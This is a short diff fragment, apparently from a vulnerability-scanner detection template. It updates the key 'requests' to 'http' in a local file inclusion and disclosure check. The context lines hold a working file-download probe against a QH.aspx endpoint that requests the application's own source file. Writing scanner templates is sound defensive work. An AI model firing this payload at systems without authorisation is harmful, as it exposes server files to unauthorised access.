@@ -10,7 +10,7 @@ info:
     - lfi
     - disclosure
 
-requests:
+http:
   - method: GET
     path:
       - "/QH.aspx?responderId=ResourceNewResponder&action=download&fileName=.%2fQH.aspx"
